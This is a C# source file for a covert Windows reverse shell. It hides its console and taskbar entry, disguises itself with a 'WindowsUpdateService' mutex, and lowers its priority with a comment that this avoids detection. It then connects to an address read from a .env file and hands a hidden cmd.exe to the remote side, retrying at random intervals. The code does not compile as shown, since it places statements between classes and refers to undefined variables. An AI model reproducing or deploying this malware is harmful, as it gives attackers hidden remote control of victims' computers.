using System;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class Config {
    public static string GetEnvVariable(string key) {
        string envFile = ".env";
        if (File.Exists(envFile)) {
            foreach (string line in File.ReadAllLines(envFile)) {
                if (line.StartsWith(key + "=")) {
                    return line.Substring(key.Length + 1);
                }
            }
        }
        return null;
    }
}

string ip = Config.GetEnvVariable("localIP");
int port = int.Parse(Config.GetEnvVariable("myPORT"));
class Program {
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("user32.dll")]
    static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
    
    [DllImport("user32.dll")]
    static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    
    const int SW_HIDE = 0;
    const int GWL_EXSTYLE = -20;
    const int WS_EX_TOOLWINDOW = 0x00000080;
    const int WS_EX_APPWINDOW = 0x00040000;
    
    static void Main(string[] args) {
        // Check if already running (prevent multiple instances)
        bool createdNew;
        using (var mutex = new System.Threading.Mutex(true, "Global\\WindowsUpdateService", out createdNew)) {
            if (!createdNew) {
                return; // Already running, exit silently
            }
            
            // Hide everything
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            
            try {
                int exStyle = GetWindowLong(handle, GWL_EXSTYLE);
                exStyle |= WS_EX_TOOLWINDOW;
                exStyle &= ~WS_EX_APPWINDOW;
                SetWindowLong(handle, GWL_EXSTYLE, exStyle);
            } catch { }
            
            // Lower process priority to avoid detection
            try {
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.BelowNormal;
            } catch { }
            
            // Random delay before connecting (0-60 seconds)
            Random rand = new Random();
            Thread.Sleep(rand.Next(0, 60000));
            
            // Run connection in background
            Thread backgroundThread = new Thread(ConnectBack);
            backgroundThread.IsBackground = true;
            backgroundThread.Start();
            
            Thread.Sleep(Timeout.Infinite);
        }
    }
    
    static void ConnectBack() {
        string ip = localIP;
        int port = myPORT;
        Random rand = new Random();
        
        while (true) {
            try {
                using (TcpClient client = new TcpClient(ip, port)) {
                    using (Stream stream = client.GetStream()) {
                        using (StreamReader reader = new StreamReader(stream)) {
                            using (StreamWriter writer = new StreamWriter(stream)) {
                                writer.AutoFlush = true;
                                
                                Process process = new Process();
                                process.StartInfo.FileName = "cmd.exe";
                                process.StartInfo.CreateNoWindow = true;
                                process.StartInfo.UseShellExecute = false;
                                process.StartInfo.RedirectStandardOutput = true;
                                process.StartInfo.RedirectStandardInput = true;
                                process.StartInfo.RedirectStandardError = true;
                                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                
                                process.OutputDataReceived += (s, e) => { 
                                    if (e.Data != null) {
                                        try { writer.WriteLine(e.Data); } catch { }
                                    }
                                };
                                process.ErrorDataReceived += (s, e) => { 
                                    if (e.Data != null) {
                                        try { writer.WriteLine(e.Data); } catch { }
                                    }
                                };
                                
                                process.Start();
                                process.BeginOutputReadLine();
                                process.BeginErrorReadLine();
                                
                                while (true) {
                                    string cmd = reader.ReadLine();
                                    if (cmd == null) break;
                                    process.StandardInput.WriteLine(cmd);
                                }
                                
                                try { process.Kill(); } catch { }
                            }
                        }
                    }
                }
            } catch {
                // Random delay between 30-90 seconds before retry
                Thread.Sleep(rand.Next(30000, 90000));
            }
        }
    }
}